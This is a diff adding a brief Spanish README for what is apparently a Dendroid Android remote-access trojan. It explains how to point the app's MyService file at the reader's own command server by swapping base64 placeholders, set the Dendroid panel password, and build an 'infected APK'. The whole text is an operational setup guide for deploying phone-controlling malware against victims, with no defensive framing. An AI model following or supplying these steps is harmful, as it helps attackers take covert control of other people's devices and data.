@@ -1,0 +1,14 @@
+Este sistema APK esta compilado con el sistema de Andorid Studio.
+
+Descargar Anodrid Studio del siguiente url: https://developer.android.com/studio/
+
+Luego deberas hacerles las correspondientes modificaciones a app/java/com/connect/MyService con el lenguaje de BASE64, para que la apk se conecte con tu propio servidor.
+
+Remplazar (G9jYWxob3N0) con el nombre de tu servidor traducido a BASE64, para ello podras usar la siguiente pagina https://www.base64encode.org/
+Luego remplazar nuevamente (G9jYWxob3N0) con el nombre de tu servidor.
+Y por ultimo remplazar (YXF1aXZhbGFjb250cmFzZcOxYQ==) por la contraseña de tu panel de control Dendorid.
+
+PD: recuerda respetar el http:// o https:// de tu servidor al convertirlo a lenguaje BASE64.
+
+Luego selecciona la pestaña Buld/build APK(s) para generar tu apk infectada.
+
